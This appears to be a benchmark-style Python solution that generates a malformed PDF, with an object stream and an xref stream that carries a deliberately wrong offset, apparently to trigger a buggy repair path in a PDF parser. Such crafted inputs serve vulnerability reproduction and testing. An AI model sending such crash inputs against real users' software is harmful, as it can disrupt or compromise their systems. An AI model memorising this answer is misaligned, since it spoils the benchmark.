import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        def pack_u(n, size):
            if size == 0:
                return b""
            if size == 1:
                return bytes([n & 0xFF])
            if size == 2:
                return struct.pack(">H", n & 0xFFFF)
            if size == 3:
                return struct.pack(">I", n & 0xFFFFFF)[1:]
            if size == 4:
                return struct.pack(">I", n & 0xFFFFFFFF)
            # generic big-endian base-256
            out = bytearray()
            for _ in range(size):
                out.append(n & 0xFF)
                n >>= 8
            return bytes(reversed(out))

        pdf = bytearray()
        # Header
        pdf += b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"

        # 1 0 obj: Catalog pointing to Pages 2 0 R (compressed object)
        o1_offset = len(pdf)
        pdf += (
            b"1 0 obj\n"
            b"<< /Type /Catalog /Pages 2 0 R >>\n"
            b"endobj\n"
        )

        # 3 0 obj: ObjStm containing object 2 0 (Pages)
        # Object stream header "2 0 " (object num=2, offset=0)
        objstm_header = b"2 0 "
        pages_obj = b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>"
        objstm_stream = objstm_header + pages_obj
        first_val = len(objstm_header)
        o3_offset = len(pdf)
        pdf += (
            b"3 0 obj\n"
            b"<< /Type /ObjStm /N 1 /First " + str(first_val).encode("ascii") +
            b" /Length " + str(len(objstm_stream)).encode("ascii") + b" >>\n"
            b"stream\n" + objstm_stream + b"\nendstream\nendobj\n"
        )

        # 4 0 obj: a minimal Page object, parent is 2 0 R
        o4_offset = len(pdf)
        pdf += (
            b"4 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] >>\n"
            b"endobj\n"
        )

        # 6 0 obj: XRef stream (will include entries for 1..6)
        o6_offset = len(pdf)

        # Build xref stream data with W [1 4 4] and Index [1 6]
        # Entries for obj 1..6
        xref_entries = []

        # 1: uncompressed, correct offset
        xref_entries.append(pack_u(1, 1) + pack_u(o1_offset, 4) + pack_u(0, 4))
        # 2: compressed in object stream 3, index 0
        xref_entries.append(pack_u(2, 1) + pack_u(3, 4) + pack_u(0, 4))
        # 3: uncompressed, WRONG offset (0) to trigger repair
        xref_entries.append(pack_u(1, 1) + pack_u(0, 4) + pack_u(0, 4))
        # 4: uncompressed, correct offset
        xref_entries.append(pack_u(1, 1) + pack_u(o4_offset, 4) + pack_u(0, 4))
        # 5: free entry
        xref_entries.append(pack_u(0, 1) + pack_u(0, 4) + pack_u(0, 4))
        # 6: xref stream itself, correct offset
        xref_entries.append(pack_u(1, 1) + pack_u(o6_offset, 4) + pack_u(0, 4))

        xref_stream_data = b"".join(xref_entries)

        xref_dict = (
            b"<< /Type /XRef"
            b" /W [1 4 4]"
            b" /Index [1 6]"
            b" /Size 7"
            b" /Root 1 0 R"
            b" /Length " + str(len(xref_stream_data)).encode("ascii") +
            b" >>"
        )

        pdf += b"6 0 obj\n" + xref_dict + b"\nstream\n" + xref_stream_data + b"\nendstream\nendobj\n"

        # startxref
        pdf += b"startxref\n" + str(o6_offset).encode("ascii") + b"\n%%EOF\n"

        return bytes(pdf)